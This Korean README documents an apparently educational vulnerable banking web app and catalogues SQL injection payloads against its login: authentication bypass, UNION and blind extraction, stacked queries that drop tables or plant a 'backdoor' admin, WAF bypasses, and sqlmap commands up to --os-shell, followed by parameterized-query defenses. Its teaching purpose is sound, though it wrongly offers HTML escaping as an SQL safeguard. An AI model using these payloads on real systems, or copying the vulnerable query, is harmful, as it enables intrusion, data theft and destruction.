# SecureBank - sql_injection 시뮬레이션

## 🚀 실행 방법

### Windows
```bash
# 배치 파일 실행
run.bat
```

### 수동 실행
```bash
# 가상환경 생성 및 활성화
python -m venv venv
venv\Scripts\activate  # Windows
source venv/bin/activate  # Linux/Mac

# 의존성 설치
pip install -r requirements.txt

# 애플리케이션 실행
python app.py
```

브라우저에서 `http://localhost:5000` 접속

## 🔐 테스트 계정

| 사용자명 | 비밀번호 | 계정유형 |
|---------|---------|---------|
| admin | admin123 | 관리자 |
| user1 | password123 | 일반고객 |
| user2 | mypassword | 일반고객 |
| guest | guest | 게스트 |

## ⚠️ SQL 인젝션 취약점 분석

### 🎯 취약점이 존재하는 이유

이 시스템은 **교육 목적**으로 의도적으로 SQL 인젝션 취약점을 포함하고 있습니다.

#### 취약한 코드 (app.py 126번째 줄):
```python
# 위험한 방법 - 사용자 입력을 직접 SQL 쿼리에 삽입
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{hashlib.sha256(password.encode()).hexdigest()}'"
cursor.execute(query)
```

### 🔓 SQL 인젝션 공격 방법

#### 1. 인증 우회 공격 (Authentication Bypass)
```
사용자명: admin' OR '1'='1' --
비밀번호: (아무거나)
```

**실행되는 쿼리:**
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '해시값'
```

**결과:** `'1'='1'`은 항상 참이므로 비밀번호 확인 없이 로그인 성공

**변형 공격:**
```
admin' OR 1=1#
admin'/**/OR/**/1=1#
admin' OR 'x'='x
admin') OR ('1'='1
```

#### 2. UNION 기반 공격 (UNION-based Attack)
```
사용자명: ' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12 --
비밀번호: (아무거나)
```

**단계별 공격:**

**2-1. 컬럼 수 확인:**
```sql
' ORDER BY 1 --    (성공)
' ORDER BY 5 --    (성공)  
' ORDER BY 10 --   (실패) → 컬럼 수는 5~9개
```

**2-2. 데이터베이스 정보 추출:**
```sql
' UNION SELECT sqlite_version(),database(),user(),4,5 --
' UNION SELECT name,sql,type,4,5 FROM sqlite_master --
```

**2-3. 테이블 구조 파악:**
```sql
' UNION SELECT name,1,2,3,4 FROM sqlite_master WHERE type='table' --
' UNION SELECT sql,1,2,3,4 FROM sqlite_master WHERE name='users' --
```

**2-4. 민감한 데이터 추출:**
```sql
' UNION SELECT username,password,email,phone,balance FROM users --
' UNION SELECT account_number,balance,transaction_date,amount,description FROM transactions --
```

#### 3. Boolean 기반 블라인드 공격 (Boolean-based Blind)
```
사용자명: ' OR 1=1 --
비밀번호: (아무거나)
```

**고급 Boolean 공격:**
```sql
-- 데이터베이스 이름 길이 확인
admin' AND (SELECT LENGTH(database()))=10 --

-- 첫 번째 테이블 이름 추출
admin' AND (SELECT SUBSTR(name,1,1) FROM sqlite_master LIMIT 1)='u' --
admin' AND (SELECT SUBSTR(name,2,1) FROM sqlite_master LIMIT 1)='s' --

-- 사용자 수 확인
admin' AND (SELECT COUNT(*) FROM users)>5 --

-- 관리자 계정 존재 확인
admin' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1 --
```

#### 4. 시간 기반 블라인드 공격 (Time-based Blind)
```sql
-- SQLite에서 시간 지연 (CASE 문 활용)
admin' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master) ELSE 1 END) --

-- 조건부 시간 지연
admin' AND (SELECT CASE WHEN (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a' THEN (SELECT COUNT(*) FROM sqlite_master,sqlite_master) ELSE 1 END) --
```

#### 5. 오류 기반 공격 (Error-based Attack)
```sql
-- 의도적 오류 발생으로 정보 추출
admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --

-- SQLite 특화 오류 기반
admin' AND (SELECT 1 FROM (SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%user%'))--

-- 타입 변환 오류 이용
admin' AND CAST((SELECT password FROM users WHERE username='admin') AS INTEGER) --
```

#### 6. 스택 쿼리 공격 (Stacked Queries)
```sql
-- 다중 쿼리 실행 (세미콜론 이용)
admin'; INSERT INTO users VALUES ('hacker','password123','hacker@evil.com','000-0000-0000',1000000); --

-- 테이블 삭제
admin'; DROP TABLE transactions; --

-- 새 관리자 계정 생성
admin'; UPDATE users SET username='backdoor' WHERE username='admin'; --
```

#### 7. 2차 SQL 인젝션 (Second-Order SQL Injection)
```sql
-- 1단계: 악성 데이터 저장
사용자명: normaluser
비밀번호: password123
이메일: test'; UPDATE users SET password='hacked' WHERE username='admin'; --

-- 2단계: 저장된 데이터가 다른 쿼리에서 실행됨
```

#### 8. NoSQL 인젝션 (MongoDB 스타일)
```javascript
// JSON 기반 공격 (웹 API에서)
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}
```

#### 9. XML 기반 SQL 인젝션
```xml
<!-- XML 파라미터를 통한 공격 -->
<user>
    <username>admin' OR '1'='1</username>
    <password>anything</password>
</user>
```

#### 10. HTTP 헤더 기반 공격
```http
-- User-Agent 헤더 이용
User-Agent: Mozilla/5.0' UNION SELECT password FROM users WHERE username='admin' --

-- X-Forwarded-For 헤더 이용  
X-Forwarded-For: 127.0.0.1' UNION SELECT * FROM users --

-- Cookie 기반 공격
Cookie: sessionid=abc123'; UPDATE users SET password='pwned' WHERE username='admin'; --
```

#### 11. 우회 기법 (Bypass Techniques)

**11-1. 공백 우회:**
```sql
admin'/**/OR/**/1=1--
admin'+OR+1=1--
admin'%09OR%091=1--  (탭 문자)
admin'%0aOR%0a1=1--  (개행 문자)
```

**11-2. 키워드 필터링 우회:**
```sql
-- OR 필터링 우회
admin' || 1=1--
admin' OR/**/1=1--
admin' %4fR 1=1--  (URL 인코딩)

-- UNION 필터링 우회
admin' /*!UNION*/ SELECT * FROM users--
admin' UN/**/ION SELECT * FROM users--
admin' UNION ALL SELECT * FROM users--
```

**11-3. 따옴표 필터링 우회:**
```sql
-- 16진수 인코딩
admin OR username=0x61646d696e--  (admin의 16진수)

-- CHAR 함수 이용
admin OR username=CHAR(97,100,109,105,110)--

-- 백슬래시 이용
admin\' OR 1=1--
```

#### 12. 고급 데이터 추출 기법

**12-1. 한 글자씩 추출:**
```sql
-- 관리자 비밀번호 첫 글자 확인
admin' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a'--

-- ASCII 값으로 비교
admin' AND (SELECT ASCII(SUBSTR(password,1,1)) FROM users WHERE username='admin')>97--
```

**12-2. 길이 기반 추출:**
```sql
-- 비밀번호 길이 확인
admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=10--

-- 테이블 개수 확인
admin' AND (SELECT COUNT(name) FROM sqlite_master WHERE type='table')=5--
```

#### 13. 자동화 도구 활용

**SQLMap 명령어 예시:**
```bash
# 기본 스캔
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test" --dbs

# 테이블 추출
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test" -D database --tables

# 데이터 덤프
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test" -D database -T users --dump

# 쉘 획득
sqlmap -u "http://localhost:5000/login" --data="username=admin&password=test" --os-shell
```

#### 14. 방어 우회 고급 기법

**14-1. WAF 우회:**
```sql
-- 대소문자 혼합
AdMiN' oR 1=1--

-- 인코딩 조합
admin%27%20OR%201=1--

-- 주석 삽입
admin'/*comment*/OR/*comment*/1=1--
```

**14-2. 길이 제한 우회:**
```sql
-- 짧은 페이로드
'OR 1#
'||1#
';--
```

### 🛡️ 안전한 코드 구현 방법

#### 매개변수화된 쿼리 (Parameterized Query)
```python
# 안전한 방법
cursor.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    (username, hashed_password)
)
```

#### 추가 보안 조치
1. **입력 검증**
```python
import re

def validate_username(username):
    # 영문, 숫자, 언더스코어만 허용
    if not re.match("^[a-zA-Z0-9_]+$", username):
        return False
    if len(username) > 50:
        return False
    return True
```

2. **이스케이프 처리**
```python
import html

def escape_input(user_input):
    return html.escape(user_input)
```

3. **최소 권한 원칙**
- 데이터베이스 사용자에게 필요한 최소한의 권한만 부여
- 읽기 전용 계정과 쓰기 계정 분리

4. **오류 메시지 제한**
- 데이터베이스 구조 정보 노출 방지
- 일반적인 오류 메시지만 표시

### 🔍 실제 피해 시나리오

SQL 인젝션 공격이 성공하면:

1. **데이터 유출**
   - 모든 고객의 개인정보 접근
   - 계좌 정보 및 거래 내역 노출
   - 시스템 로그 및 관리자 정보 획득

2. **권한 상승**
   - 일반 사용자가 관리자 권한 획득
   - 시스템 전체 제어 가능

3. **데이터 조작**
   - 계좌 잔액 변경
   - 거래 내역 조작
   - 사용자 정보 수정/삭제

### 📊 관리자 시스템 접근

SQL 인젝션으로 관리자 권한 획득 시 접근 가능한 정보:

- **고객 관리**: 전체 고객 정보 및 계좌 상세 내역
- **거래 모니터링**: 모든 거래 내역 실시간 조회
- **시스템 로그**: 접속 기록 및 보안 감사 로그
- **통계 및 보고서**: 비즈니스 인텔리전스 데이터

## 📁 프로젝트 구조

```
sql_injection_simulator/
├── app.py                 # 메인 애플리케이션 (취약점 포함)
├── requirements.txt       # 의존성 목록
├── run.bat               # Windows 실행 스크립트
├── README.md             # 프로젝트 설명
├── users.db              # SQLite 데이터베이스 (자동 생성)
└── templates/            # HTML 템플릿
    ├── base.html         # 기본 템플릿
    ├── login.html        # 로그인 페이지
    ├── dashboard.html    # 사용자 대시보드
    ├── admin_dashboard.html    # 관리자 대시보드
    ├── customer_detail.html    # 고객 상세 정보
    └── admin_reports.html      # 관리자 보고서
```

## 🔧 기술 스택

- **Backend**: Python Flask
- **Database**: SQLite
- **Frontend**: HTML, CSS, Bootstrap 5, Font Awesome
- **Security**: 의도적 취약점 (교육용)

## 📱 주요 기능

### 로그인 시스템
- 사용자 인증 및 세션 관리
- 계정 유형별 권한 관리
- **SQL 인젝션 취약점 포함**

### 사용자 대시보드
- 개인정보 조회
- 계좌 잔액 확인
- 거래 내역 조회

### 관리자 시스템
- 전체 고객 관리
- 거래 모니터링
- 시스템 로그 조회
- 비즈니스 보고서

## 📚 학습 목표

1. SQL 인젝션 취약점의 원리 이해
2. 취약한 코드와 안전한 코드의 차이점 학습
3. 실제 공격 시나리오 체험

